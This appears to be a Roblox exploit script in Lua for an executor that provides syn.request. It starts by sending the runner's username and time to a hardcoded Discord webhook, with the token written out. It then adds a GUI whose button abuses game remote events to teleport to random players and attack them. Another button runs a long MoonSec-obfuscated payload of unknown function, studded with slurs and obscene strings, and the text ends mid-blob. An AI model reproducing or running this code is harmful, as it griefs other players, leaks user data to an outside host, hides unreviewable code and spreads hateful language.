repeat
wait()
until game:IsLoaded()
wait(0.5)
local wh = 'https://discord.com/api/webhooks/958446886816215131/zm4NKSfPfHRrrmldxYTmPenpGxIrrTnKbSPCszQkPJr0SHzTFpSmmKpbZzTx5NJ3aGsJ' -- your webhook

local embed1 = {
    ["title"] = game.Players.LocalPlayer.Name .." Executed the pubes gui script at: "..os.date("%H:%M", os.time())
}
local a =
    syn.request(
    {
        Url = wh,
        Headers = {["Content-Type"] = "application/json"},
        Body = game:GetService("HttpService"):JSONEncode({["embeds"] = {embed1}, ["content"] = ""}),
        Method = "POST"
    }
)
local ScreenGui = Instance.new("ScreenGui")
local GiveAllRepFrame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local TextButton = Instance.new("TextButton")
local UICorner_2 = Instance.new("UICorner")
local TextLabel = Instance.new("TextLabel")
local UICorner_3 = Instance.new("UICorner")
local TextButton_2 = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local TextButton_3 = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local TextButton_4 = Instance.new("TextButton")
local UICorner_6 = Instance.new("UICorner")
local TextButton_5 = Instance.new("TextButton")
local UICorner_7 = Instance.new("UICorner")
local TextButton_6 = Instance.new("TextButton")
local UICorner_8 = Instance.new("UICorner")
local Frame = Instance.new("Frame")
local Frame_2 = Instance.new("Frame")
local Frame_3 = Instance.new("Frame")
local Frame_4 = Instance.new("Frame")
local TextButton_7 = Instance.new("TextButton")
local UICorner_9 = Instance.new("UICorner")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false

GiveAllRepFrame.Name = "GiveAllRepFrame"
GiveAllRepFrame.Parent = ScreenGui
GiveAllRepFrame.BackgroundColor3 = Color3.fromRGB(85, 0, 127)
GiveAllRepFrame.Position = UDim2.new(0, 0, 0.291076541, 0)
GiveAllRepFrame.Size = UDim2.new(0, 485, 0, 424)
GiveAllRepFrame.Visible = false

UICorner.Parent = GiveAllRepFrame

TextButton.Parent = GiveAllRepFrame
TextButton.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
TextButton.Position = UDim2.new(0.0569695234, 0, 0.23497881, 0)
TextButton.Size = UDim2.new(0, 189, 0, 79)
TextButton.Font = Enum.Font.Sarpanch
TextButton.Text = "Give All SV/SH"
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextSize = 30.000
TextButton.TextStrokeTransparency = 0.800

TextButton.MouseButton1Click:Connect(function()

_G.on = 1

if _G.on == 1 then

shared.io = game:GetService('RunService').RenderStepped:Connect(function()
local RandomPlayer = game.Players:GetPlayers()[math.random(#game.Players:GetPlayers())]
if RandomPlayer.PrivateStats.PsychicPower.Value >= game:GetService("Players").LocalPlayer.PrivateStats.PsychicPower.Value * 100 then
local repvalue = RandomPlayer.leaderstats.Status.Value
if RandomPlayer.leaderstats.Status.Value == "Supervillain" or RandomPlayer.leaderstats.Status.Value == "Superhero" or RandomPlayer.leaderstats.Status.Value == "Innocence" then
    return
end
game.ReplicatedStorage.RemoteEvent:FireServer({"Respawn"})
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = RandomPlayer.Character.HumanoidRootPart.CFrame
local args = {
    [1] = {
        [1] = "Skill_SoulAttack_Start",
        [2] = RandomPlayer
    }
}

game:GetService("ReplicatedStorage").RemoteEvent:FireServer(unpack(args))
local args = {
    [1] = {
        [1] = "Skill_SoulAttack_End"
    }
}

game:GetService("ReplicatedStorage").RemoteEvent:FireServer(unpack(args))
task.wait()
local args = {
    [1] = {
        [1] = "Skill_SoulAttack_Start",
        [2] = RandomPlayer
    }
}

game:GetService("ReplicatedStorage").RemoteEvent:FireServer(unpack(args))
local args = {
    [1] = {
        [1] = "Skill_SoulAttack_End"
    }
}

game:GetService("ReplicatedStorage").RemoteEvent:FireServer(unpack(args))
task.wait()
game.Lighting.Blur.Enabled = false
game.Players.LocalPlayer.PlayerGui.IntroGui.Enabled = false
game.Players.LocalPlayer.PlayerGui.ScreenGui.Enabled = true
end
end)
end

end)

UICorner_2.Parent = TextButton

TextLabel.Parent = GiveAllRepFrame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 0, 255)
TextLabel.Position = UDim2.new(0.200867683, 0, 0.0440267883, 0)
TextLabel.Size = UDim2.new(0, 289, 0, 69)
TextLabel.Font = Enum.Font.Roboto
TextLabel.Text = "Mestalic Psychic Gui V2"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 25.000

UICorner_3.Parent = TextLabel

TextButton_2.Parent = GiveAllRepFrame
TextButton_2.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
TextButton_2.Position = UDim2.new(0.0661426783, 0, 0.730261803, 0)
TextButton_2.Size = UDim2.new(0, 188, 0, 78)
TextButton_2.Font = Enum.Font.Sarpanch
TextButton_2.Text = "Other Psychic Gui"
TextButton_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_2.TextSize = 28.000
TextButton_2.TextStrokeTransparency = 0.800


TextButton_2.MouseButton1Click:Connect(function()
    
    _, Protected_by_MoonSecV2, Discord = 'discord.gg/gQEH2uZxUk'


,nil,nil;(function() _msec=(function(e,n,o)local E=n["ئحؠضسزن؃ڪڝضزئزز"];local H=o[e[((0x5d3-763)+-#"psx real dupe steal all ur pets no joke")]][e["ڪآقآقحدن"]];local x=(10+-#{(function()return{','}end)(),1,{},",";{},","})/((-#[[W4rboy was here]]+(0x4bca/(0x21e-(0xa710/132))))/0x25)local i=(86+(((-123+-0x161d)+-#[[Lana Rhoades]])/69))-(-#{(function()return#{('kPBLKf'):find("\66")}>0 and 1 or 0 end),{};'nil';'}';","}+6)local z=o[e[(0x191-232)]][e["نضحؠكزؠسججئآئ"]];local B=(-#"Negro"+((-0x3b+((35616/0xe0)+-#"monkey mode"))-83))+(-#'impulse 2022'+(112-0x62))local I=o[e[(0x1716/10)]][e["سدئ؃ڪحضنحئضئؠئڝئئج"]]local d=(0x1ea/245)-(((((-122+0x31)+155)+-#"Negro")+-0x45)+-#[[niggers]])local s=(-#{(function()return#{('fMPbbO'):find("\80")}>0 and 1 or 0 end),1;'}';'}',59;{}}+9)local b=(38+(-0x62+(((0x1298+-87)+-#[[nicowashere]])/74)))local k=(0x108/((((-0x58-10)+0x2712)+-#"never gonna give you up never gonna let you down")/112))local c=(-#[[Impulse youtube real]]+((-0x73+(((0x177c8/148)-378)+-#[[0nly 1337]]))-0x7d))local U=(-#[[algebra]]+(137+(((0x6d-68)-0x3e)+-106)))local _=(189/(-#"testing this thingy lololollez"+(244-(-23+((9936/0x36)+-#'send nudes')))))local h=((0x1aa+(-#'sussy'+((0x44-86)-17)))/193)local t=((0x97+(-#'Ur mom'+(-23968/(0x1ed-(0x248-315)))))-0x24)local w=(-#{(function()return{','}end)();1,'}',{},","}+7)local u=((427+-#{'nil';{},32,1;1})/211)local f=(290/((0x7dfa/(-#{'}';",";(function()return{','}end)();'}',{};'nil';(function()return#{('KlBLBb'):find("\66")}>0 and 1 or 0 end)}+222))+-#[[balls]]))local M=(236/(-#[[impulse was here pastebin reel]]+((11845+-#{{};197;",",78;1})/0x50)))local D=((171-(-#{",",86;",";(function()return#{('bLMmPL'):find("\77")}>0 and 1 or 0 end);'}';(function()return#{('bLMmPL'):find("\77")}>0 and 1 or 0 end);1}+154))+-#"33 cocks in my mouth")local m=(11+-#{",",(function()return#{('MKfLoM'):find("\102")}>0 and 1 or 0 end);166;(function()return#{('MKfLoM'):find("\102")}>0 and 1 or 0 end);(function()return{','}end)();166,'}'})local P=((-#[[Fucking Retarted]]+((((-70+0xd14)-0x6a1)+-#'lego hax')-0x31d))/0xbe)local p=(0x144/(266-(191+-#{{};",";(function()return{','}end)(),{};1;{}})))local S=((0x3cd+((-68+-0x3b)+0x3e))/227)local L=(8+-#{{};(function()return{','}end)(),'}';'nil'})local K=e[(-#"send nudes"+(0x82aa/25))];local W=o[e[(0x164-187)]][e["جڝجنئؠټح"]];local A=o[(function(e)return type(e):sub(1,1)..'\101\116'end)('ڝكسجقڝكج')..'\109\101'..('\116\97'or'ڝ؃قكحجقټ')..e[((0x52b-710)+-#[[I FUCKING HATE FEMBOYS]])]];local O=o[e[(1280-0x2b1)]][e["؃ضككنڪدئ"]];local y=((0x1e6/9)+-#"If LocalPlayer equals Dumbass then while true do end")-((0x2b29/(-#[[Faggot]]+(0x6231/189)))-0x55)local g=(86-((311+-0x7c)-103))-(-0x29+43)local F=o[e[(278+-0x6d)]][e["ڪنڪسئڝټئسڝڪڝضززحڝ"]];local n=function(e,n)return e..n end local v=(0x1e-26)*(-#"impulse was here omg"+(-42+(-#[[yeet]]+(0xe5-(269+-0x6e)))))local R=o[e["د؃كقق؃ضك"]];local r=(-#[[impulse reel pastebin]]+(145-0x7a))*(((57368-(57527-0x7089))/191)+-#[[legend says i was here]])local j=(0x2e000/184)*(226/(-#'big niggers sucking cock'+(-105+(0x242-336))))local q=(-0x20+(-#'Fucking losed 027728272728271'+(-0x13+(0x5598/166))))local C=((((-0x73+3749)+-#[[nerd]])/0x1e)-119)*(0x188/196)local N=o[e["سحئقڪآآضڝسجح"]]or o[e[(7683/0xd)]][e["سحئقڪآآضڝسجح"]];local a=((0x3d+(-129+0x2f))+0x115)local e=o[e["سنټجزئحآ؃آزضڝكآجضكس"]];local I=(function(a)local r,o=2,0x10 local n={j={},v={}}local l=-d local e=o+i while true do n[a:sub(e,(function()e=r+e return e-i end)())]=(function()l=l+d return l end)()if l==(v-d)then l=""o=y break end end local l=#a while e<l+i do n.v[o]=a:sub(e,(function()e=r+e return e-i end)())o=o+d if o%x==y then o=g O(n.j,(F((n[n.v[g]]*v)+n[n.v[d]])))end end return I(n.j)end)("..:::MoonSec::..؃دحجئضسزقكنؠآټڪڝڪضحټقضضضحضدڪآككضسضجضسسدكټڝكجنزحكڪضؠضقضنققنسكدض؃زآڪنحسسئزدڪآضنسقزضكڝقآؠآزقسسححنقڝسټجض؃ضټضڪقټسؠدقدئزدسڪقآ؃زضڝؠآضكضسضجڝجضقئڝجئڝقكآ؃ڪضؠضقضضضحضزض؃ټټضندجټ؃ضټضنضآقننقكجقدقڝئآزقننجآڪكضسضجضسآجسدحټنؠقزنضجحقڪن؃جحڪڝضآضكضټآكسزدئ؃دقڪضننزنئكڝدقكضضحضڝضدضڝسټزنكآئؠټنؠزضئضدضټټسآحدنؠئسضندئكڝسضجض؃ضحقدنڪزنؠزسئقدنآآآنقڪسنآڝكضسضجضئڝئقدئڪجقكزنئقحئڪكؠنحقڝقآضكضسضزآسنئكنقزڪئضدضڪض؃حڪسؠآكجضڪجك؃نآككنآسټننضزضئضضؠضئحزڪقؠنجؠڝڝآضكضسضزؠسڪئز؃نآقننقزضؠدنڝزټټجئڝضآضكضآكنقسؠڝض؃ڪڪقسضزټئسحزڝحآدقنسقجقج؃ز؃جض؃ضټضڪقټڪؠكزڪضڝدنڝجآققټضڪجضزآزدجض؃ضټضڪسټكنكضنضټحكڝزؠسسقضسجقڝټڪنجض؃ضټضنضزضئضئضحضكټقآضضحضڝضڝؠككئقټنزكححآنؠدئټدضڪضؠضآټآنكحضسجج؃ئآڪككآسټؠنضزضئضسضضددسڝڪؠنكزؠسآنكضسضجضضزجڪ؃آټټؠكنټڪضؠضقضضضحضڝضدآټضزؠجڪ؃ضټضنضؠزؠئزكضڪڝؠڝئآزققضنئټكقسضجض؃ضجسدضټڪقدضزڪضؠضقضؠآجآؠ؃ح؃كزټحجؠنڝسسآكضجزڪحؠندح؃قق؃كسنڝدسجآكئننڝحڝنحدآقدڝڪزقنسئڝآڝئدززد؃كق؃كسنڝدسدڪ؃ججؠټئنؠكحضقټآڝضؠڪكزضكڝضدؠكجضنڪڪجزق؃آضزڝكسدكنئآآكحكك؃آنكضسضجضئقئددئڪآؠجقؠڪؠؠضقضضضدقؠئڪڝسضق؃ضڝسزټڪنضزضئضقآئندزڪټآئكئس؃؃ڪټكئآجټ؃ضټضنضؠزؠئزكضڪڝآڝڪآزكئنجآټكضسضجضضقجقدزټنؠجضآضندڪكؠس؃حضڝضآضڝقآټكنسقئ؃؃قټسؠدقدئنحز؃ټسټحضڝضآض؃ضآسنقزكجن؃زټڪؠجئجئقحئڝحقئكزضسجآآئټنق؃جق؃آڪؠټڝقند؃ڪڝؠضقضضضضجڝجنزجكټزقكحسؠكضك؃ضجڝدڝڪضؠضقضن؃قڪضقج؃ڪضټدكسزڪجندززقئؠدضڪضؠضټحآئكجس؃حن؃ڪټنجك؃ضټضنضټآنسقحئندزققضضحضڝض؃نڪقؠضدټ؃ټټضنضزضسكڝنآنئؠڪټقآئئڪحؠآكضسضجض؃ضټضحضآسقضؠ؃ڪټؠضقضضضسڪسججق؃كآسنجسقجننقزڝئضدضڪضدڪڝقآدققسدجئ؃قټننزسنكسنكزضئضدضضكدڪڝحؠن؃آڝآآضكضسضزټزكئكدضؠآننقكق؃ؠآقضضضحضضؠجز؃ئټحقزئآدزسسززئضدضڪضحئڝقجټحؠڝضآضكضدڝڪكآسضزن؃ؠضحآدكڪضؠضقضؠآقسسححنڪئسكجض؃ضټضڪټټننسزكؠكؠآقضضضحضضټجك؃كټضسڝجئ؃ئئدزؠئضدضڪضجحسڝڝكټآسدجنسكسكجض؃ضټض؃زنؠئجڝجحدآدقضضضحضجڪجج؃ؠټئن؃سنحق؃نڪزؠؠزنضزټڪقكضضحضڝضددڝنآؠنكئدټؠنضزضئضضسضححئڝنآجككك؃آنكضسضجضضقجقدئڪزننحؠڪؠؠضقضضضقزجټڪسقضحټڪنحڪټڪنضزضئضسآضئحزڝ؃آقكضضسحقڝنقڪجن؃ضټضنضآحؠئقجئنحڪڝنضسحضڝضآضڝئ؃دجڝ؃ضټضنضؠ؃ضجڪضققجزټقزس؃ټؠحئؠڪضزنجض؃ضټضټقزټحزؠزسج؃سكق؃حټؠزؠڪجؠؠئضټكزآ؃سڪكسڪحآنكضڝحنقڪضضحضڝضحقڝټآسنزسسجقدكټنؠزقنڪسؠضقضضضكضآنآؠكضسضجضنټئ؃آححڪضټزئڪ؃ؠآقضضضحض؃آټقزقدئقؠئكڝقدنقدئضدضڪض؃كڝزؠڪقآضآحن؃زنننؠسنئجدكجسئقدضڪضؠضڝجؠنكآدڪآآكضسضجضضؠجن؃قڪكؠئقزدقحنقڪضضحضڝضدآڝسټدن؃زقئض؃نټننكجڝڝؠؠضقضضضئئ؃سنجئقټكززحقؠكضقؠئنؠجټڪقزآټئندسج؃جنححزټكزززنټسنضزضئضزسق؃ؠكقضضضحضجټحنڝسآكدآ؃آټضنضزضقققئضزدنآآآنقڪك؃ټئكضسضجضئسجك؃كؠنؠؠزنضجحكآټؠسكجضكجدڝنټزڝج؃ضټضنضزضئضدضحقڝضزڝضؠحضڝضآضڪزآننحزئئك؃نحئئؠدضڪضؠضآزسق؃سكټئحټؠڪټجن؃ضټضنضآنقكزڪضحڪزئسسسحضڝضآضڪزآننضزدجڪ؃قټسؠكزنئك؃قڝكآئكزضسحآڝنؠئئج؃ضټضنضټآنسقحئنحقڪنآجكقضنڝئڝټټكنكزضكسنڪزضئضدضحقدټڪسآزقسضقجكڝنټزئؠ؃ڪټضنضزضؠآقئضزح؃ڝقآضقسضقحندټسڪجض؃ضټضڝضڪدنسقڪئنحزآآآنقڪئئټ؃كضسضجضضدئئ؃قټسؠدسضضددسڝڪؠنكزټآآقكضسضجضئسحضڪڪئكئآدضڪضؠضڪكؠڪكقضقجئ؃زآككزدجټضنضزضكجزنضآحكڝئآجكقسئحؠ؃كنڝققضئحجسسزڪئضدضڪضڝزڝئؠككڪجؠجئ؃زآقكنضئڪضنضزضئضضټضنححڪسآجكئضڪحكڪزټئنئزكحض؃سڪزؠكڝآڪكؠضقضضضسڝسقجئ؃جندجؠ؃ضټضنضڪقنټزسئكحئڝآكحجدڝضآضكضقسئدآضقق؃سآدئآڝسندئجټضزسكنڝؠآضكضسضكټسححزټكنسسقزقڪقؠضقضضضضق؃كندڪئسڝجض؃ضټضڪآټنؠكسقئنحزڝؠؠڪققضنئټنحسضجض؃ضجسدضټڪزئقآئندزڪټآئكئس؃جقآئؠئجك؃ضټضنضؠټننزسئكآؠك؃ضضحضڝضجدڝنآسككسنئزدقڪكنسقكضقسئقنضضحضڝض؃قكضجسڪ؃زكددنټزضئضدضحزحئڪكآڪسآسڪجز؃ئزؠجن؃ضټضنضؠټؠئقجئنحڪججضؠحضڝضآض؃ټټضكقسسئدددضآئكدضڪضؠضڝضؠسكزسكز؃كضسضجض؃ضټضنضزټقضجڪڪنؠضقضضضسقضټحن؃قټكزد؃كټضنضزضنسئزآآئزڪزس؃حضڝضآضټسآكنحسڪئجڝزټنؠحقئضكدنح؃ضټحضڝضآضڝزآڪنكجججزدټڪئؠزكټڪټؠضقضضضسټسكجك؃ضؠضنئزقئكئ؃زكئضدضڪضڝقڪسآققټضقآنكضسضجضئئټززضح؃آ؃آجڪآؠضقضضضسقضڪجكڝڪټڝكنزجئننقزضئضدضجددنڪآسقحضڝضآضكضسضجضئددضزنزكئضدضڪضڪؠقضجدآكجدټ؃كضسضجضضدجن؃سټكننقزئزحئڪسآزقكسقآضكضسضجزضسټضنضزضئكدضڪضؠضكزنححضڝضآضؠنسضجض؃ضټضنضزضئضدضڪضؠضقضضضحضڝضآضكسسضجض؃ضټضنضقزئضدضڪسؠضڪضضضحضڝضټزكضسضجس؃ضدئنضزضئضجؠڪضؠضقسضضحڪڝضآسكضنسجض؃ك؃ضنضزضئضدڪڪضؠسقضضضئجڝضآضكضسسجض؃ضټضنزآسئضدسڪضؠضقضضضحض؃زآزكضسسجضحڝټضنضزضئضدضڪضؠسقضضضحضڝضآضنزسآجض؃زټضڪڝزضئضدضڪز؃سقضضقحضڝسآضكضسضجضجدټضنكزضئسدضڪضؠضقضضضحضڝنآضكقسضجض؃ضڪزنضزضئؠدضحضؠضقضضضحضڝضآضكنسضجز؃ضټزنضزؠئضدضڪكؠضڪدضضحسڝضآنكضسكسض؃ضټضنضټدئضدسڪضؠضآجضضحنڝضآقكضسضجضدزدقنضزؠئضزآڪضؠضقضسزحضڝضآآكضقڝجض؃ضټضؠززضئضدټڪضڝدقضضضحض؃زآضكضسڪجض؃كټضنضزضضزدضڪضؠڝقضنئحضڝضآضكضسضجض؃آټضنڝزضئزدضڪضؠضقضضؠحضڝؠآضكآسضجض؃ضټضننزضئزدضڪزؠضقؠضضحضڝكآضڝدسضجس؃ضټننضزكزضدضڪضؠضڪدضضحسڝضآضټجسضجن؃ضټقنضزضئضحزحقؠضقؠضضقآڝضآضكضززجض؃ضټآنضكڝئضدضڪضآزقضضضحټڝضحسكضسضجضدزټضنضزڪئضئؠڪضؠضقضسزحضڝضآڝكضزنجض؃ضټضنضزضئضدآڪضؠڝقضضزحضڝضآضكضسؠجض؃ؠټضنآزضئضدضڪضؠنقضضزحضڝزآضكؠسضجض؃كټض؃دزضئسدضڪنؠضقكقضحضڝضآضڝدسضجس؃ضټضڪجزضئندضڪقؠضقضضضحزئسآضكؠسضجز؃ضټضنضزضضضدضڪنؠضقزضضحزڝضآؠكنسضجن؃ض؃ضنضزسئضدسڪضؠكؠضضضحضڝضڝضكضسسجض؃ك؃ضنضزضئضز؃ڪضؠسقضضضسجڝضآنكضسقجض؃ضټضؠزنؠئضدؠڪض؃سقضضضحض؃زآضكضسآجضسزټضنضزضضزدضڪضؠټقضكقحضڝضآضكضسضجض؃آټضنآزضئټدضڪؠؠضقضضآحضجدآضكسسضجس؃ضټكټضزضئضدضحدؠضقسضضجزحجآضكآسضضڝ؃ضټضنضقزئآدضڪټؠضقسضضحضڝضټزكآسضجڪ؃ض؃زنضزضئضحزڪآؠضقڝضضكؠڝضآضكضسضئح؃ضټآنضزڝئضدزڪضؠضآدضضحؠڝضآؠكضسآجض؃ؠحئنضزؠئضضضڪضؠسقضضضحضڝكڝضكضسضجضئضټضنسزضئكئضڪضؠضقضكسحضڝسآضنزكججض؃ؠټضؠؠزضئضدضڪضآضقضضنحضڝزآضكزسضجؠدآټضنكزضنددضڪسؠضقنضضحكحضآضكضسضكد؃ضټسنضزضقجدضڪنؠضققضضحضڝضټزټقسضجؠ؃ضحسنضزضئضحزڪضؠضقآضضئڝڝضآضكضززجض؃ضټټنضنآئضدضڪضآزقضضضحڪڝضڪئكضسضجضدزټضنضزڝئضدنڪضؠضقضضضحضڝضآآكضسڝجض؃زټضنضزضئضدؠڪضؠؠقضضآحضڝضآضكضسنجض؃زټضنززضئؠدضڪضؠكقضؠدحضڝسآضكنسضجكجضټضنضزضنددضڪسؠضقضكجحضڝنآضكقسضجض؃ضڪزڝؠزضئؠدضجسؠضقضضضجزڝضآضكآسضضڝ؃ضټضنضقزئضدضڪټؠضڝجضضحضڝضټزكضسضجڪ؃ضڪ؃نضزضئضحزڪضؠضقڝضضض؃ڝضآضكضسضجض؃ضټآنضزڝئضدزڪضؠضقضضضحؠڝضآؠكضسآجض؃ضټضنضزنئضدزڪضؠزقضضضحضڝضآككضسنجض؃ضټضنكزضئضدضڪضددقضضسحضڝضټنكضسكجض؃ضټضنضزضئضدضڪضؠكقضضسحضڝضآضكؠؠئجض؃كټض؃ؠزضئسدضڪضؠضقكقضحضڝضآضڝؠسضجس؃ض؃ضڪسزضئندضضدؠضقڝضضجزڝزآضكنسضق؃؃ضټضنضزضسجدضڪضؠضقسضضحضڝضټزآجسضجن؃ضئقنضزضئضدؠ؃ضؠضقؠضضحقڝضآسكضسسجض؃ضدڝنضزضئضدزڪضؠضقضضضئكڝضآنكضسزجض؃سټضنكنضئضدضڪضدسقضضسحض؃زڝجكضسنجضئضټضنضزضضزدؠڪضؠؠقضآآحضڝضآضؠضسضجض؃ؠټضنؠزضقندضڝزؠضقضضټحضدڝآضكضسضئز؃ضټضنڪزضسحدضڪضؠضكزضضحضڝڝآضټكسضجض؃ضڪزنضزضض؃دضڝڝؠضقضضضحضڝضآضكټسضئ؃؃ضټزنضزضئضدضڪڪؠضقسضضحضڝضآضكضسضجؠ؃ضټڪنضزضئضدضڪضؠضقنضضحضڝضآزكضسضجڪ؃ضټننضزسئضدسڪضؠضنجضضحضڝضآسكضسضجض؃نټضنضزضئقدټڪضؠضقضض؃حكڝضآضكضكزجآټضقسؠؠزضئضدضڪضكټقؠضضحضڝض؃زنقئسټټقحدؠؠآزقئضدضڪضڝزككحسجآڝكآضكضسضسسدټؠقئكزضئضدضڪضؠضقضضضدضجئكسكضسضجض؃ضټضنضڪضقضؠدڝدؠضقضضضئس؃دقضئقآسقد؃آؠسسد؃جكضجس؃سؠضقضضضجزحجآضكقسضجټ؃ضټضنضزضقددضڪقؠضققضضحسڝضآؠڪئسضجق؃ضټآنضزسئضدضڪضؠكؠضضضحضڝضآآكضسسجضدز؃جنضزقئضدټڪضؠضقضضضسدڝضآقكضسقجض؃سټضنضقكئضدقڪضؠزقضضضحض؃زآآكضسقجض؃ؠټضنضزضضزدسڪضؠكقضضزحضڝضآضنزسضجض؃نټضنؠزضئضدضڪضؠضقضضؠحضڝضآضكضسضئز؃ضټضنآزضئؠدضڪضؠضقكضضحضڝنآضؠحسضجس؃ضټضڪجزضئڪدضڪكؠضقضضضجزجټآضكڝسضجق؃ضټضنضكضئضدضڪڝؠضقڝضضحسڝضڪضكضسضئ؃؃ضټضنضزكئضدضڪضؠضكحضضحټڝضآضكضسضجض؃ضڪجنضزټئضدضڪضؠضقضضضج؃ڝضټجكضسزجضحضټضنضق؃ئضح؃ڪضؠنقضضضحضڝضټ؃كضسزجض؃زټضنضزضئضح؃ڪضآ؃قضضقحضدضآضكضز؃جضد؃ټضنآزضئضدضڪضؠڝقضضزحضڝزآضكضسضجض؃كټضنڪزضئڝدضڪضؠضقضضڪحضڝقآضكزسضضض؃ضټضنقزضئڪدضڪآؠضقكزنحضڝنآضنحسضجس؃ضڪزټجزضئندضڪټؠضقضضضحض؃قآضكنسضجس؃ضټكنضزضضكدضڪكؠضقزضضحضڝضآضؠجسضجض؃ضټسنضزضئضدضڪضؠضقضضسحسڝضآضكضئټجن؃ضټضنضؠئئزڪضك؃ج؃قټضضحضڝضآضكضسضجس؃ضټضنضزضئضحزدجؠضقزضضحسڝضآضكضسؠضض؃ضټقنضزضئضدسڪضؠزقضضضسڝڝضآضكضسسجض؃ضټضنضؠڝئضدضڪضؠضقضضضحضڝضڪككضسزجض؃زټضنسزضئضحكڪضؠسقضضزحضڝضآضكضقججض؃ضټضنسزضئضدضڪسؠضقضضضحضڝكآضكضسضزح؃نټضنضزضزقدكؠسسكڝؠسآجدڝضآضكضكټئزټجق؃دجؠزس؃؃جنزئكڪسزكنڪڝڝآضكضسضسټدزؠ؃ئزڝ؃كججزټكزس؃كنضجدڝضآضكضكؠجكڪقززحجآحسز؃قكضئحڪققزجضڝضآضكضززسج؃ضټضنضزقئضدضڪضؠؠقنضضحضڝضټدكضسسجض؃سټضنكنضئضدضڪضآدقضضسحض؃زڝجكضسضجض؃زټضنضزضئؠدنڪضؠضقضسدحضڝسآضكسسضجكجضټضنضزضضددضڪسؠضكزقجحضڝضآضككسضجض؃ضټؠڝئزضئضدضڪڝؠضقسضضحضڝضآكآضسضجض؃ضټڝنضزسئضدكدضؠضقضضضجدڝضآسكضززسج؃ضټضنضزسئضدضڪضټضكجضضحضڝضآضكضسكجض؃ض؃زنضزسئضدسڪضؠضقضضضجضڝضآضكضسزجض؃زټضنضقسئضدضڪضؠضقضضضحضڝضڪجكضسضجض؃سټضنضزضئضدضڪضؠضقضضضحضڝضآضكسسضجض؃ضټضآجزضئضدضڪسؠضقضضضحضڝضآضكضسضجس؃ضټضنضكڝئندضڪضؠضآئسسڝټنحئقككسضجض؃ضڪزټجزضئضدضڪسؠضقضضضحضحزآضكسسضجض؃ضټضنضزضسكدضڪضؠضقزضضحسڝضآضؠجسضجض؃ضټسنضزضئضدضڪضؠضقضضزحزڝضآضكضد؃جض؃ضټضنضزضئضدضڪضضدقنضضحضڝض؃ئكزجضڪ؃ق؃ڝجنضزضئضحزڪآؠضقزضضحسڝضآضكضززجآ؃ضټقنضزسئضدضڪضآزؠجضضحكڝضآزكضسضجض؃ؠڝضنضزنئضدضڪضؠسقضضكحضڝض؃ڝكضسضجض؃زټضنضزضئضضڝڪضؠضقضضضحضڝضآضكضنڝجض؃ضټضنقزضئضدضڪضڝڝقضضضحضڝسآضكضسضجضحكټضنكزضئزدضڪسؠضقؠكححضڝضآضندسضجس؃ضټسنضزكزضدضڪضؠضكدضضحسڝضآكآضسضجض؃ضڪڝنضزسئضدؠححؠضقضضضجئڝضآسكضسسجض؃ك؃ضنضزضئضحئڪضؠسقضضكضضڝضآضكضزڝجض؃سټضنؠكسئضدسڪضآڝقضضسحضڝضآضكككضجض؃ضټضؠڝزضئسدضڪضټټقضضكحضڝزآضكقسضجضحټټضننزضئقدضڪزؠضقؠكححضڝكآضنؠسضجس؃ضټننضزكزضدضڪضؠضكؠضضحسڝضآكآضسضجض؃ضڪڝنضزسئضدض؃ټؠضقكضضحزڝضآقكضسضضټ؃ضټننضزقئضدزڪضؠؠآحضضحكڝضڪ؃كضسسجض؃نټضنكنضئضدضڪضټ؃قضضسحضڝضټنكضسكجض؃ضټضنضزضئضدضڪضؠكقضضسحضڝضآضكضزكجض؃كټضنززضئضدضڪضټجقضضضحضڝسآضكضسضجس؃ضټضنضزضئضدضڪضؠضقآضضحضڝضآضنؠسضجض؃ضټسنضزضئضدضڪضؠضقضضضحضڝضآضكضسضجض؃ضټضنضزضئضدضڪضؠضقضضضحضڝضآقكضسضجض؃ضټضنضزضئضدضڪضؠضقضضضحضڝضآضكضسزجض؃ضټضنضزضئضدضڪضؠسقضضضحضڝضآضكضسض");local O=(-#'0nly was here mf'+(119+-0x37))local l=27 local o=d;local e={}e={[(51/0x33)]=function()local e,n,i,d=z(I,o,o+B);o=o+C;l=(l+(O*C))%a;return(((d+l-(O)+r*(C*x))%r)*((x*j)^x))+(((i+l-(O*x)+r*(x^B))%a)*(r*a))+(((n+l-(O*B)+j)%a)*r)+((e+l-(O*C)+j)%a);end,[(-0x61+99)]=function(e,e,e)local e=z(I,o,o);o=o+i;l=(l+(O))%a;return((e+l-(O)+j)%r);end,[(0x1b+-24)]=function()local e,n=z(I,o,o+x);l=(l+(O*x))%a;o=o+x;return(((n+l-(O)+r*(x*C))%r)*a)+((e+l-(O*x)+a*(x^B))%r);end,[(-0x7b+127)]=function(o,e,n)if n then local e=(o/x^(e-d))%x^((n-i)-(e-d)+i);return e-e%d;else local e=x^(e-i);return(o%(e+e)>=e)and d or g;end;end,[((8473/(0xf8+-19))+-#'i bought a boost for this string')]=function()local n=e[(-0x50+81)]();local l=e[(-#'legend says i was here'+(-0x6c+131))]();local c=d;local o=(e[(-0x35+57)](l,i,v+C)*(x^(v*x)))+n;local n=e[((-#'Cock and ball tortue'+(0x7d+-74))-27)](l,21,31);local e=((-d)^e[(((167+-0x38)+-#[[paidlancer]])+-97)](l,32));if(n==g)then if(o==y)then return e*g;else n=i;c=y;end;elseif(n==(r*(x^B))-i)then return(o==g)and(e*(i/y))or(e*(g/y));end;return H(e,n-((a*(C))-d))*(c+(o/(x^q)));end,[(918/0x99)]=function(n,x,x)local x;if(not n)then n=e[((2680/0x43)+-#[[psx real dupe steal all ur pets no joke]])]();if(n==g)then return'';end;end;x=W(I,o,o+n-d);o=o+n;local e=''for n=i,#x do e=K(e,F((z(W(x,n,n))+l)%a))l=(l+O)%r end return e;end}local function j(...)return{...},R('#',...)end local function I()local t={};local h={};local n={};local w={t,h,nil,n};local o={}local f=(54+-#{'}','}',99;",";1;(function()return{','}end)()})local 